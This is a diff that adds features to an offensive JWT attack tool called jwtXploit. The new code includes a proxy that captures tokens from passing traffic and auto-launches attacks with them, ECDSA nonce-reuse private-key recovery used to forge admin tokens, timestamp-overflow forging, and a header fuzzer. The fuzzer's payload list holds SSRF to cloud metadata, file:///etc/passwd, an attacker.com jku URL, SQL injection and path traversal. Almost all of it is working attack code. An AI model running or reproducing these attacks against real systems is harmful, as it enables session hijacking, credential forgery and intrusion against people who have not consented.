+        for part in cookie.split(";"):
+            val = part.split("=", 1)[-1].strip()
+            if val.count(".") == 2 and len(val) > 20:
+                found.append(val)
+        # Body scan (e.g. JSON token fields)
+        jwt_re = re.compile(r'eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*')
+        found.extend(jwt_re.findall(body.decode("utf-8", errors="ignore")))
+        return found
+
+    def _handle_request(self, method):
+        try:
+            content_len = int(self.headers.get("Content-Length", 0))
+            body = self.rfile.read(content_len) if content_len > 0 else b""
+        except Exception:
+            body = b""
+
+        jwts = self._extract_jwts(dict(self.headers), body)
+        for raw_token in jwts:
+            token_hash = hashlib.sha256(raw_token.encode()).hexdigest()[:16]
+            if token_hash not in _InterceptHandler._seen_hashes:
+                _InterceptHandler._seen_hashes.add(token_hash)
+                _InterceptHandler._queue.append(raw_token)
+                print(Fore.GREEN + Style.BRIGHT +
+                      f"\n[INTERCEPT] 🎯 New JWT captured (hash={token_hash}): {raw_token[:60]}...")
+                if self._target_url or CONFIG.get("intercept_url"):
+                    tgt = self._target_url or CONFIG.get("intercept_url")
+                    print(Fore.CYAN + f"[INTERCEPT] ⚡ Queuing autopwn against {tgt}...")
+                    threading.Thread(
+                        target=run_autopwn,
+                        args=(raw_token, tgt),
+                        daemon=True
+                    ).start()
+
+        # Forward request to actual destination
+        try:
+            dest = self.headers.get("Host", "")
+            if not dest.startswith("http"):
+                dest = f"http://{dest}"
+            target = dest + self.path
+            fwd_headers = {k: v for k, v in self.headers.items()
+                           if k.lower() not in ("host", "content-length")}
+            resp = requests.request(method, target, headers=fwd_headers, data=body,
+                                    allow_redirects=False, timeout=10, verify=False)
+            self.send_response(resp.status_code)
+            for k, v in resp.headers.items():
+                if k.lower() in ("content-length", "transfer-encoding", "connection"):
+                    continue
+                try:
+                    self.send_header(k, v)
+                except Exception:
+                    pass
+            self.end_headers()
+            self.wfile.write(resp.content)
+        except Exception as e:
+            self.send_response(502)
+            self.end_headers()
+            self.wfile.write(f"Proxy error: {e}".encode())
+
+    def do_GET(self):     self._handle_request("GET")
+    def do_POST(self):    self._handle_request("POST")
+    def do_PUT(self):     self._handle_request("PUT")
+    def do_DELETE(self):  self._handle_request("DELETE")
+    def do_PATCH(self):   self._handle_request("PATCH")
+
+    def log_message(self, fmt, *args):
+        pass  # silence per-request logs
+
+
+def run_intercept(port, target_url=None, wordlist=None):
+    """
+    Start the passive JWT capture proxy.
+    All HTTP traffic passing through port is inspected for JWTs.
+    Every unique JWT triggers an immediate autopwn thread.
+    """
+    _InterceptHandler._target_url = target_url
+    _InterceptHandler._seen_hashes.clear()
+    _InterceptHandler._queue.clear()
+    CONFIG["intercept_url"] = target_url
+
+    server = socketserver.ThreadingTCPServer(("0.0.0.0", port), _InterceptHandler)
+    server.daemon_threads = True
+    lan_ip = get_lan_ip()
+
+    print(Fore.YELLOW + "\n" + "═" * 64)
+    print(Fore.YELLOW + f"  🕵️  INTERCEPT MODE — Passive JWT Capture Proxy")
+    print(Fore.YELLOW + "═" * 64)
+    print(Fore.CYAN + f"[*] Proxy listening on: {lan_ip}:{port}")
+    print(Fore.CYAN + f"[*] Configure browser/tool to use HTTP proxy: {lan_ip}:{port}")
+    if target_url:
+        print(Fore.CYAN + f"[*] Autopwn target: {target_url}")
+    print(Fore.CYAN + "[*] Every unique JWT captured will immediately trigger full autopwn.")
+    print(Fore.YELLOW + "[*] Press Ctrl+C to stop and generate report.\n")
+
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print(Fore.YELLOW + f"\n[*] Intercept stopped. Captured {len(_InterceptHandler._seen_hashes)} unique JWT(s).")
+        server.shutdown()
+
+
+# ──────────────────────────────────────────────────────────────
+#  PHASE 10 — ATTACK #26: ECDSA NONCE (k) REUSE KEY RECOVERY
+# ──────────────────────────────────────────────────────────────
+
+# P-256 curve order n
+_P256_N = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
+
+
+def _ecdsa_parse_sig(token):
+    """
+    Extract (r, s) integers from an ES256 JWT signature.
+    ES256 signature = raw 64 bytes: r (32) || s (32)
+    Returns (r, s) as Python ints, or (None, None) on failure.
+    """
+    try:
+        parts = token.split(".")
+        sig_bytes = base64.urlsafe_b64decode(pad_b64(parts[2]))
+        if len(sig_bytes) < 64:
+            return None, None
+        r = int.from_bytes(sig_bytes[:32], "big")
+        s = int.from_bytes(sig_bytes[32:64], "big")
+        return r, s
+    except Exception:
+        return None, None
+
+
+def _ecdsa_signing_input_hash(token):
+    """Return SHA-256 hash of header.payload as an integer."""
+    parts = token.split(".")
+    signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
+    h = hashlib.sha256(signing_input).digest()
+    return int.from_bytes(h, "big")
+
+
+def _modinv(a, m):
+    """Extended Euclidean algorithm for modular inverse."""
+    g, x, _ = _extended_gcd(a % m, m)
+    if g != 1:
+        raise ValueError("No modular inverse")
+    return x % m
+
+
+def _extended_gcd(a, b):
+    if a == 0:
+        return b, 0, 1
+    g, x, y = _extended_gcd(b % a, a)
+    return g, y - (b // a) * x, x
+
+
+def _ecdsa_recover_private_key(r, s1, s2, h1, h2, n=_P256_N):
+    """
+    Recover ECDSA private key d from two signatures sharing nonce k (same r).
+    k  = (h1 - h2) * modinv(s1 - s2, n) mod n
+    d  = (s1*k - h1) * modinv(r, n) mod n
+    """
+    if r == 0 or s1 == s2:
+        return None
+    try:
+        k = ((h1 - h2) * _modinv((s1 - s2) % n, n)) % n
+        if k == 0:
+            return None
+        d = ((s1 * k - h1) * _modinv(r, n)) % n
+        return d
+    except ValueError:
+        return None
+
+
+def attack_ecdsa_k_reuse(token, url=None, token2=None):
+    """
+    ECDSA Nonce (k) Reuse Key Recovery.
+    If two ES256 tokens share the same nonce k (detected by equal r values),
+    the EC private key d can be recovered with simple algebra.
+    Once d is known, any payload can be signed as the original server.
+
+    Requires: two ES256 tokens signed with the same private key + same k.
+    Provide the second token via --ec-key-recover TOKEN2.
+    """
+    header = get_header(token)
+    alg    = header.get("alg", "")
+
+    if not alg.startswith("ES"):
+        print(Fore.YELLOW + f"[*] alg={alg} — ECDSA k-reuse requires an ES256/ES384/ES512 token.")
+        return
+
+    if not token2:
+        if CONFIG.get("autopwn"):
+            print(Fore.YELLOW + "[AUTOPWN] ECDSA k-reuse skipped — needs --ec-key-recover TOKEN2.")
+            return
+        token2 = input(Fore.YELLOW + "[?] Enter second ES256 token (for k-reuse check): ").strip()
+        if not token2:
+            return
+
+    r1, s1 = _ecdsa_parse_sig(token)
+    r2, s2 = _ecdsa_parse_sig(token2)
+
+    if None in (r1, s1, r2, s2):
+        print(Fore.RED + "[-] Could not parse ES256 signatures from one or both tokens.")
+        return
+
+    print(Fore.CYAN + f"\n[+] ECDSA k-Reuse Analysis:")
+    print(Fore.CYAN + f"    r1 = {hex(r1)[:18]}...")
+    print(Fore.CYAN + f"    r2 = {hex(r2)[:18]}...")
+
+    if r1 != r2:
+        print(Fore.YELLOW + "[*] r values differ — no nonce reuse detected between these two tokens.")
+        print(Fore.YELLOW + "[*] Collect more tokens and retry. Nonce reuse is probabilistic.")
+        return
+
+    print(Fore.RED + Style.BRIGHT + "\n[!] 🔑 NONCE REUSE DETECTED — r1 == r2!")
+    print(Fore.RED + "[!] Attempting private key recovery...")
+
+    h1 = _ecdsa_signing_input_hash(token)
+    h2 = _ecdsa_signing_input_hash(token2)
+    d  = _ecdsa_recover_private_key(r1, s1, s2, h1, h2)
+
+    if not d:
+        print(Fore.RED + "[-] Key recovery math failed (degenerate inputs).")
+        return
+
+    print(Fore.RED + Style.BRIGHT + f"\n[!] 💥 PRIVATE KEY RECOVERED: d = {hex(d)}")
+
+    # Convert d to PEM for signing
+    try:
+        from cryptography.hazmat.primitives.asymmetric.ec import (
+            EllipticCurvePrivateNumbers, SECP256R1, ECDSA, EllipticCurvePublicNumbers
+        )
+        from cryptography.hazmat.primitives.asymmetric import ec as ec_mod
+        # Derive public key point from d
+        curve    = SECP256R1()
+        priv_key = ec_mod.derive_private_key(d, curve, default_backend())
+        priv_pem = priv_key.private_bytes(
+            serialization.Encoding.PEM,
+            serialization.PrivateFormat.PKCS8,
+            serialization.NoEncryption()
+        ).decode()
+
+        # Forge a new token with admin claims
+        decoded  = decode_token(token)
+        modified = dict(decoded)
+        if CONFIG.get("escalate_role"):
+            for k in ("role", "isAdmin", "scope"):
+                if k in modified:
+                    modified[k] = CONFIG["escalate_role"]
+        modified = apply_exp_strip(modified)
+
+        forged = jwt.encode(modified, priv_pem, algorithm="ES256",
+                            headers={"alg": "ES256", "typ": "JWT"})
+        print(Fore.RED + Style.BRIGHT + "\n[!] Forged ES256 token with recovered private key:")
+        print_result("ECDSA k-Reuse Key Recovery — forged ES256", forged, modified,
+                     {"alg": "ES256"})
+        check_url(forged, url)
+
+    except Exception as e:
+        print(Fore.RED + f"[-] Could not forge token with recovered key: {e}")
+        print(Fore.YELLOW + f"[*] Raw private key integer: d = {hex(d)}")
+
+
+# ──────────────────────────────────────────────────────────────
+#  PHASE 10 — ATTACK #27: TIMESTAMP INTEGER OVERFLOW
+# ──────────────────────────────────────────────────────────────
+
+_TS_EDGE_CASES = [
+    ("INT32_MAX",   2**31 - 1),      # 2038 problem — 32-bit parsers overflow → 0 → epoch
+    ("INT32_OVERFLOW", 2**31),       # one past max — some C parsers treat as -1 (past)
+    ("INT64_MAX",   2**63 - 1),      # 64-bit overflow — parsing may wrap to negative
+    ("NEGATIVE",    -1),             # -1 nbf → always valid (some libs: abs() or ignore)
+    ("ZERO",        0),              # epoch — token issued in 1970, might bypass iat checks
+    ("FAR_FUTURE",  2**32),          # year 2106 — unsigned 32-bit overflow back to 0
+    ("YEAR_2038",   2147483647),     # classic 32-bit unix overflow date
+    ("MAX_UINT32",  4294967295),     # max unsigned 32-bit
+]
+
+
+def attack_timestamp_overflow(token, url=None):
+    """
+    JWT Timestamp Integer Overflow / Edge Case.
+    Tests 8 edge cases for nbf, iat and exp claims:
+      INT32_MAX, INT32_OVERFLOW, INT64_MAX, NEGATIVE (-1),
+      ZERO (epoch), FAR_FUTURE, YEAR_2038, MAX_UINT32.
+    Many JWT parsers written in C/Go/Java use fixed-width integers for
+    timestamp parsing — overflow causes bypasses where tokens are treated
+    as always-valid, never-expired, or already-valid.
+    """
+    decoded         = decode_token(token)
+    original_header = get_header(token)
+    alg             = original_header.get("alg", "HS256")
+
+    print(Fore.CYAN + f"\n[*] Timestamp Overflow — testing {len(_TS_EDGE_CASES)} edge cases (nbf, iat, exp each)...")
+
+    for claim in ("nbf", "exp", "iat"):
+        for label, ts_val in _TS_EDGE_CASES:
+            fuzzed = dict(decoded)
+            fuzzed[claim] = ts_val
+            # For exp overflow: also clear nbf so token is valid
+            if claim == "exp":
+                fuzzed.pop("nbf", None)
+
+            try:
+                if alg.startswith("HS"):
+                    forged = jwt.encode(fuzzed, "", algorithm=alg,
+                                        headers=original_header)
+                else:
+                    hb = base64.urlsafe_b64encode(
+                        json.dumps(original_header, separators=(",",":")).encode()
+                    ).rstrip(b"=").decode()
+                    pb = base64.urlsafe_b64encode(
+                        json.dumps(fuzzed, separators=(",",":")).encode()
+                    ).rstrip(b"=").decode()
+                    forged = f"{hb}.{pb}."
+
+                print_result(f"Timestamp Overflow — {claim}={label} ({ts_val})",
+                             forged, fuzzed, original_header)
+                check_url(forged, url)
+                if CONFIG["findings"] and CONFIG["findings"][-1].get("verified"):
+                    print(Fore.RED + Style.BRIGHT +
+                          f"\n[!] 💥 TIMESTAMP BYPASS: {claim}={label} accepted!")
+            except Exception as e:
+                print(Fore.RED + f"[-] {claim}={label}: {e}")
+
+
+# ──────────────────────────────────────────────────────────────
+#  PHASE 10 — ATTACK #28: HEADER PARAMETER INJECTION FUZZER
+# ──────────────────────────────────────────────────────────────
+
+_HEADER_FUZZ_PARAMS = [
+    # RFC 7515 / RFC 7516 obscure headers
+    ("crit",        ["b64", "zip", "custom-ext"]),  # critical extensions array
+    ("crit",        []),                             # empty crit array — bypass
+    ("zip",         "DEF"),                          # DEFLATE compression
+    ("zip",         "GZIP"),
+    ("zip",         ""),
+    ("b64",         False),                          # non-base64-encoded payload (RFC 7797)
+    ("b64",         True),
+    ("cty",         "application/json"),
+    ("cty",         "text/plain"),
+    ("cty",         "JWT"),                          # nested JWT hint
+    # Attacker URL params
+    ("x5u",         "http://169.254.169.254/latest/meta-data/"),   # SSRF via x5u
+    ("x5u",         "file:///etc/passwd"),
+    ("jku",         "http://localhost/jwks.json"),
+    ("jku",         "https://attacker.com/jwks.json"),
+    # Unknown / custom extension headers
+    ("svt",         "1"),                            # Signed Video Technology (IoT)
+    ("trust_chain", ["chain1", "chain2"]),           # STIR/SHAKEN
+    ("custom_ext",  {"inject": True}),
+    ("x-amz-security-token", "FAKE_TOKEN"),          # AWS-specific
+    ("azp",         "attacker-client-id"),           # Authorized party claim
+    # Null / empty / malformed values
+    ("alg",         ""),                             # empty alg string
+    ("alg",         None),                           # null alg
+    ("alg",         "NONE"),
+    ("alg",         "none "),                        # trailing space bypass
+    ("alg",         " none"),                        # leading space
+    ("typ",         None),                           # null typ
+    ("typ",         ""),
+    ("kid",         None),                           # null kid
+    ("kid",         ""),
+    ("kid",         "../../etc/passwd"),             # path traversal in kid
+    ("kid",         "' OR '1'='1"),                  # SQL injection in kid
+    ("kid",         "http://169.254.169.254/"),      # SSRF in kid
+    # Large / oversized values
+    ("kid",         "A" * 4096),                     # buffer overflow probe
+    ("jku",         "A" * 4096),
+]
+
+
+def attack_fuzz_header(token, url=None):
+    """
+    JWT Header Parameter Injection Fuzzer.
+    Iterates 30+ obscure and malformed header parameters including:
+      crit (empty/populated), zip, b64, x5u SSRF, jku injection,
+      svt/trust_chain (IoT), null/empty alg/typ/kid, SQL injection in kid,
+      AWS-specific headers, oversized values for buffer overflow probing.
+    Catches custom/internal JWT libraries that process non-standard headers.
+    """
+    decoded         = decode_token(token)
+    original_header = get_header(token)
+    alg             = original_header.get("alg", "HS256")
+
+    print(Fore.CYAN + f"\n[*] Header Fuzz — testing {len(_HEADER_FUZZ_PARAMS)} parameter variants...")
+
+    for param, value in _HEADER_FUZZ_PARAMS:
+        fuzzed_header = dict(original_header)
+        if value is None:
+            fuzzed_header.pop(param, None)  # remove the key
+            label = f"{param}=<absent>"
+        else:
+            fuzzed_header[param] = value
+            val_preview = str(value)[:40]
+            label = f"{param}={val_preview}"
+
+        try:
+            payload_to_use = apply_exp_strip(dict(decoded))
+            if alg.startswith("HS") and value is not None:
+                forged = jwt.encode(payload_to_use, "", algorithm="HS256",
+                                    headers=fuzzed_header)
+            else:
+                hb = base64.urlsafe_b64encode(
+                    json.dumps(fuzzed_header, separators=(",",":"), default=str).encode()
+                ).rstrip(b"=").decode()
+                pb = base64.urlsafe_b64encode(
+                    json.dumps(payload_to_use, separators=(",",":")).encode()
+                ).rstrip(b"=").decode()
+                forged = f"{hb}.{pb}."
+
+            print_result(f"Header Fuzz — {label}", forged, payload_to_use, fuzzed_header)
+            check_url(forged, url)
+            if CONFIG["findings"] and CONFIG["findings"][-1].get("verified"):
+                print(Fore.RED + Style.BRIGHT + f"\n[!] 💥 HEADER INJECTION ACCEPTED: {label}")
+        except Exception as e:
+            pass  # skip silently — many combinations are intentionally malformed
+
+
+# ──────────────────────────────────────────────────────────────
+#  PHASE 10 — --compare-envs: CROSS-ENVIRONMENT DRIFT DETECTION
+# ──────────────────────────────────────────────────────────────
+
+def compare_envs_mode(token_files, url=None):
+    """
+    Cross-Environment JWT Drift Detection.
+    Load tokens from N files (dev.txt, staging.txt, prod.txt …).
+    Test each token against --url (typically the production endpoint).
+    Flag any token from a non-prod environment that is accepted by prod.
+
+    Classic vulnerability: weak signing secrets in dev/staging that
+    accidentally work in prod due to misconfigured algorithm validation.
+    Also cross-tests tokens between environments for secret sharing.
+    """
+    if not url:
+        if CONFIG.get("autopwn"):
+            print(Fore.YELLOW + "[AUTOPWN] --compare-envs needs --url. Skipping.")
+            return
+        url = input(Fore.YELLOW + "[?] Enter production URL to test against: ").strip()
+        if not url:
+            print(Fore.RED + "[-] URL required for --compare-envs.")
+            return
+
+    env_tokens = {}   # {env_name: [token, ...]}
+    for fpath in token_files:
+        env_name = os.path.splitext(os.path.basename(fpath))[0]
+        try:
+            with open(fpath, encoding="utf-8") as fh:
+                tokens = [l.strip() for l in fh if l.strip() and not l.startswith("#")]
+            env_tokens[env_name] = tokens
+            print(Fore.CYAN + f"[*] Loaded {len(tokens)} token(s) from '{env_name}' ({fpath})")
+        except FileNotFoundError:
+            print(Fore.RED + f"[!] File not found: {fpath}")
+
+    if not env_tokens:
+        print(Fore.RED + "[-] No token files loaded.")
+        return
+
+    session = requests.Session()
+    timeout = CONFIG.get("timeout", 10)
+    proxy   = CONFIG.get("proxy")
+    ssl_ver = CONFIG.get("ssl_verify", True)
+    if proxy:
+        session.proxies = {"http": proxy, "https": proxy}
+
+    print(Fore.YELLOW + "\n" + "═" * 64)
+    print(Fore.YELLOW + f"  🌍  COMPARE-ENVS MODE — Testing {sum(len(v) for v in env_tokens.values())} tokens against {url}")
+    print(Fore.YELLOW + "═" * 64)
+
+    results_table = []
+    for env_name, tokens in env_tokens.items():
+        for token in tokens:
+            _rate_sleep()
+            try:
+                resp = session.get(
+                    url,
+                    headers={"Authorization": f"Bearer {token}"},
+                    verify=ssl_ver, timeout=timeout
+                )
+                accepted = resp.status_code in (200, 201, 204)
+                payload  = decode_token(token)
+                sub_val  = payload.get("sub", payload.get("user_id", "?"))
+                results_table.append((env_name, sub_val, token[:30] + "...", resp.status_code, accepted))
+
+                if accepted:
+                    print(Fore.RED + Style.BRIGHT +
+                          f"\n[!] 💥 CROSS-ENV ACCEPTED: [{env_name}] sub={sub_val} → HTTP {resp.status_code}")
+                    finding = {
+                        "attack":        f"Cross-Environment JWT Drift — [{env_name}] token accepted on prod",
+                        "token":         token,
+                        "payload":       payload,
+                        "header":        get_header(token),
+                        "verified":      True,
+                        "verify_reason": f"[{env_name}] token accepted on production endpoint (HTTP {resp.status_code})",
+                        "delivery":      "Authorization: Bearer",
+                        "poc_curl":      f'curl -s "{url}" -H "Authorization: Bearer {token}"',
+                        "timestamp":     time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+                    }
+                    CONFIG["findings"].append(finding)
+                    _notify_webhook(finding)
+                else:
+                    print(Fore.GREEN + f"  [OK] [{env_name}] sub={sub_val} → HTTP {resp.status_code} (rejected)")
+            except Exception as e:
+                print(Fore.RED + f"[!] Request error for [{env_name}]: {e}")
+
+    # Summary table
+    print(Fore.YELLOW + "\n" + "─" * 64)
+    print(Fore.YELLOW + f"  COMPARE-ENVS RESULTS:")
+    accepted_count = sum(1 for r in results_table if r[4])
+    for env, sub, tok_preview, code, ok in results_table:
+        sym = "✅ ACCEPTED" if ok else "⛔ rejected"
+        print(f"  [{env:12}] sub={sub:10} HTTP {code}  {sym}  {tok_preview}")
+    print(Fore.YELLOW + "─" * 64)
+    if accepted_count:
+        print(Fore.RED + Style.BRIGHT +
+              f"\n[!] {accepted_count} cross-environment token(s) accepted on production!")
+    else:
+        print(Fore.GREEN + "\n[+] No cross-environment tokens accepted — environments are isolated ✅")
+
+
 def run_autopwn(token, url, wordlist=None):
     """Run all automatable attack vectors non-interactively and test each against URL."""
     if not url:
@@ -2705,10 +3908,24 @@ def run_autopwn(token, url, wordlist=None):
         ("PS256 PSS Blinding",          attack_ps256_blinding),
         ("Cookie Security Flags",       attack_cookie_security),
         ("Replay Detection",            attack_replay_detect),
+        ("OpenID Provider Confusion",   attack_openid_fuzz),
+        ("Timestamp Integer Overflow",  attack_timestamp_overflow),
+        ("Header Parameter Fuzzer",     attack_fuzz_header),
     ]
+    # JWE attacks — only run if token is a JWE
+    if _is_jwe(token):
+        autopwn_attacks.insert(0, ("JWE Inner JWT alg:none",   attack_jwe_alg_none))
+        autopwn_attacks.insert(1, ("JWE alg:dir Confusion",    attack_jwe_dir_confusion))
+        autopwn_attacks.insert(2, ("JWE PBES2 Brute Force",    lambda t, u: attack_jwe_pbes2_brute(t, wordlist, u)))
     if wordlist:
         autopwn_attacks.append(
             ("Weak Key Brute Force", lambda t, u: attack_weak_signing_key(t, wordlist, u))
+        )
+    # ECDSA k-reuse needs a second token — skip in autopwn unless --ec-key-recover provided
+    if CONFIG.get("ec_key_recover"):
+        token2 = CONFIG["ec_key_recover"]
+        autopwn_attacks.append(
+            ("ECDSA k-Reuse Key Recovery", lambda t, u: attack_ecdsa_k_reuse(t, u, token2))
         )
 
     for name, fn in autopwn_attacks:
@@ -2724,6 +3941,8 @@ def run_autopwn(token, url, wordlist=None):
     print(Fore.YELLOW + "[AUTOPWN] Scan complete.")
     print(Fore.YELLOW + "[AUTOPWN] Skipped (require manual input):")
     print(Fore.YELLOW + "   ↷ Algorithm Confusion  (needs key file or second token for sig2n)")
+    print(Fore.YELLOW + "   ↷ ECDSA k-Reuse        (pass second token with --ec-key-recover)")
+    print(Fore.YELLOW + "   ↷ Compare-Envs          (use --compare-envs FILE [FILE ...])")
     print(Fore.YELLOW + f"{chr(9552) * 64}\n")
 
 
@@ -2832,6 +4051,15 @@ def main():
     parser.add_argument("--claim-fuzz",       action="store_true", help="Fast-track to privilege claim fuzzing (attack #17) — skip menu")
     parser.add_argument("--replay",           action="store_true", help="Fast-track to token replay detection (attack #21)")
     parser.add_argument("--replay-count",     type=int, default=5, metavar="N", help="Number of replay attempts (default: 5)")
+    parser.add_argument("--openid-fuzz",      action="store_true", help="Fast-track to OpenID Connect provider confusion (attack #25)")
+    parser.add_argument("--diff-tokens",      metavar="FILE", help="Load N tokens from FILE, diff claims, test horizontal escalation")
+    parser.add_argument("--intercept",        type=int, metavar="PORT", default=0, help="Start passive JWT capture proxy on PORT (e.g. 8080) — auto-autopwn captured tokens")
+    # Phase 10 flags
+    parser.add_argument("--nuclei-export",   metavar="DIR",  help="Export confirmed findings as Nuclei YAML templates to DIR")
+    parser.add_argument("--ec-key-recover",  metavar="TOKEN2", help="Second ES256 token for ECDSA k-reuse (nonce reuse) private key recovery")
+    parser.add_argument("--fuzz-header",     action="store_true", help="Fast-track to JWT header parameter injection fuzzing (attack #28)")
+    parser.add_argument("--ts-overflow",     action="store_true", help="Fast-track to JWT timestamp integer overflow testing (attack #27)")
+    parser.add_argument("--compare-envs",    metavar="FILE", nargs="+", help="Compare-envs: test dev/staging tokens (files) against production --url")
     parser.add_argument("-o", "--output",     metavar="FILE", help="Save report to this file after the session")
     parser.add_argument("--format",           choices=["json", "txt", "md", "sarif", "html"], default="json", metavar="FMT", help="Report format: json (default), txt, md, sarif, or html")
     args = parser.parse_args()
@@ -2846,9 +4074,9 @@ def main():
         args.token = args.token or env_token
         args.url   = args.url   or env_url or None
 
-    # Require either token or --batch
-    if not args.token and not args.batch:
-        parser.error("provide a token, use --batch FILE, or use --env")
+    # Require either token or --batch or --diff-tokens or --intercept or --compare-envs
+    if not args.token and not args.batch and not args.diff_tokens and not args.intercept and not args.compare_envs:
+        parser.error("provide a token, use --batch FILE, --diff-tokens FILE, --intercept PORT, --compare-envs FILE, or --env")
 
     # Populate global config
     CONFIG["proxy"]          = _validate_proxy(args.proxy)
@@ -2866,6 +4094,10 @@ def main():
     CONFIG["jitter"]         = args.jitter
     CONFIG["webhook"]        = args.webhook
     CONFIG["replay_count"]   = args.replay_count
+    CONFIG["intercept_url"]  = args.url
+    CONFIG["nuclei_export"]  = args.nuclei_export
+    CONFIG["ec_key_recover"] = args.ec_key_recover
+    CONFIG["original_url"]   = args.url or ""
 
     if args.quiet:
         print(f"INFO: jwtXploit  token={str(args.token or 'batch')[:30]}...  url={args.url or 'none'}")
@@ -2878,6 +4110,20 @@ def main():
         if CONFIG["quiet"]:
             confirmed = sum(1 for f in CONFIG["findings"] if f.get("verified"))
             sys.exit(1 if confirmed else 0)
+        return
+
+    # ── INTERCEPT MODE ───────────────────────────────────────────
+    if args.intercept:
+        run_intercept(args.intercept, target_url=args.url, wordlist=args.wordlist)
+        if CONFIG["output_file"]:
+            save_report(CONFIG["output_file"], CONFIG["output_format"])
+        return
+
+    # ── DIFF TOKENS MODE ─────────────────────────────────────────
+    if args.diff_tokens:
+        diff_tokens_mode(args.diff_tokens, url=args.url)
+        if CONFIG["output_file"]:
+            save_report(CONFIG["output_file"], CONFIG["output_format"])
         return
 
     # Always scan payload for embedded secrets on load
@@ -2895,6 +4141,13 @@ def main():
             save_report(CONFIG["output_file"], CONFIG["output_format"])
         return
 
+    # --openid-fuzz: fast-track to OpenID provider confusion
+    if args.openid_fuzz:
+        attack_openid_fuzz(args.token, args.url)
+        if CONFIG["output_file"]:
+            save_report(CONFIG["output_file"], CONFIG["output_format"])
+        return
+
     # --claim-fuzz: fast-track to privilege claim fuzzing
     if args.claim_fuzz:
         attack_claim_fuzz(args.token, args.url)
@@ -2907,6 +4160,39 @@ def main():
         attack_replay_detect(args.token, args.url, count=args.replay_count)
         if CONFIG["output_file"]:
             save_report(CONFIG["output_file"], CONFIG["output_format"])
+        return
+
+    # --compare-envs: cross-environment JWT drift detection (no token required)
+    if args.compare_envs:
+        compare_envs_mode(args.compare_envs, url=args.url)
+        if CONFIG["output_file"]:
+            save_report(CONFIG["output_file"], CONFIG["output_format"])
+        return
+
+    # --fuzz-header: header parameter injection fuzzer
+    if args.fuzz_header:
+        attack_fuzz_header(args.token, args.url)
+        if CONFIG["output_file"]:
+            save_report(CONFIG["output_file"], CONFIG["output_format"])
+        return
+
+    # --ts-overflow: timestamp integer overflow testing
+    if args.ts_overflow:
+        attack_timestamp_overflow(args.token, args.url)
+        if CONFIG["output_file"]:
+            save_report(CONFIG["output_file"], CONFIG["output_format"])
+        return
+
+    # --ec-key-recover: ECDSA k-reuse private key recovery
+    if args.ec_key_recover:
+        attack_ecdsa_k_reuse(args.token, args.url, token2=args.ec_key_recover)
+        if CONFIG["output_file"]:
+            save_report(CONFIG["output_file"], CONFIG["output_format"])
+        return
+
+    # --nuclei-export standalone (export without running attacks)
+    if args.nuclei_export and not args.token:
+        export_nuclei_templates(args.nuclei_export)
         return
 
     # Print attack recommendations (always shown)
@@ -2949,6 +4235,10 @@ def main():
         "19": ("PS256 RSA-PSS Signature Blinding",               attack_ps256_blinding),
         "20": ("JWT Cookie Security Flag Scanner",               attack_cookie_security),
         "21": ("Token Replay Detection",                         attack_replay_detect),
+        "22": ("JWE Inner JWT alg:none",                         attack_jwe_alg_none),
+        "23": ("JWE alg:dir Confusion (known CEK brute)",        attack_jwe_dir_confusion),
+        "24": ("JWE PBES2 Password Brute Force",                 lambda t, u: attack_jwe_pbes2_brute(t, args.wordlist, u)),
+        "25": ("OpenID Connect Provider Confusion",              attack_openid_fuzz),
     }
 
     print(Fore.CYAN + "[*] Choose an attack method:")
